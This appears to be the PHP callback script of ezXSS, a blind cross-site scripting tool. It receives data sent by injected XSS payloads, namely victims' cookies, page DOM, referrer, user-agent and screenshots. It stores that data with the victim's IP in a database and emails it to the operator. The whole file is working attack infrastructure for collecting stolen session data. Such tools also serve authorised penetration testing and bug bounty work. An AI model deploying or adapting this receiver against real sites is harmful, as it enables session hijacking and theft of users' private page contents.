<?php

  //error_reporting(0);
  echo "github.com/ssl/ezXSS";

  if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    die();
  }

  //> Decode the JSON from the post
  $json = file_get_contents('php://input');
  $jsonDecoded = json_decode($json, true);

  //> Some information and settings
  $userIP = $_SERVER["REMOTE_ADDR"];
  $domain = htmlspecialchars($_SERVER['SERVER_NAME']);

  //> How much chars to send via MAIL - a long dom can take >10min in clients like Gmail to process.
  //> 0 is full, 500 is recommened since full dom is not always needed in email
  $domPart = 500;

  if($domPart > 0) $domExtra = "\n\nView full dom on the report page or change this setting in the callback file";
  else $domExtra = "";

  //> Create image
  $image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $jsonDecoded["screenshot"]));
  $imageName = time() . md5($jsonDecoded["uri"] . time() . bin2hex(openssl_random_pseudo_bytes(16))) . bin2hex(openssl_random_pseudo_bytes(5));
  $saveImage = fopen("manage/assets/images/reports/$imageName.png",'w');
  fwrite($saveImage, $image);
  fclose($saveImage);

  $imageUrl = $domain . "/manage/assets/images/reports/$imageName.png";

  //> Require Database for query and
  require_once __DIR__ . "/manage/src/Database.php";
  $database = new Database();

  //> Insert into DB
  $id = $database->lastInsertId("INSERT INTO reports (`cookies`, `dom`, `origin`, `referer`, `screenshot`, `uri`, `user-agent`, `ip`, `time`) VALUES (:cookies, :dom, :origin, :referer, :screenshot, :uri, :userAgent, :ip, :time)",
  array(":cookies" => $jsonDecoded["cookies"], ":dom" => $jsonDecoded["dom"], ":origin" => $jsonDecoded["origin"],":referer" => $jsonDecoded["referrer"], ":screenshot" => $imageUrl, ":uri" => $jsonDecoded["uri"], ":userAgent" => $jsonDecoded["user-agent"],":ip" => $userIP, ":time" => time()));

  //> Alert email
  $email = $database->newQueryArray("SELECT * FROM settings WHERE setting='email' LIMIT 1");

  //> Send email
  $htmlTemplate = str_replace(
    ["{{id}}", "{{domain}}", "{{url}}", "{{ip}}", "{{referer}}", "{{user-agent}}", "{{cookies}}", "{{dom}}", "{{screenshot}}", "{{origin}}", "{{time}}"],
    [$id, $domain, htmlspecialchars($jsonDecoded["uri"]), $userIP, htmlspecialchars($jsonDecoded["referrer"]), htmlspecialchars($jsonDecoded["user-agent"]), htmlspecialchars($jsonDecoded["cookies"]), htmlspecialchars(substr($jsonDecoded["dom"], 0, $domPart)) . $domExtra, $imageUrl, htmlspecialchars($jsonDecoded["origin"]), date('Y/m/d h:i:s A')],
    file_get_contents("manage/src/templates/site/mail.htm")
  );

  $headers[] = 'MIME-Version: 1.0';
  $headers[] = 'Content-type: text/html; charset=iso-8859-1';

  mail($email["value"], "[ezXSS] XSS on " . htmlspecialchars($jsonDecoded["uri"]), $htmlTemplate, implode("\r\n", $headers));
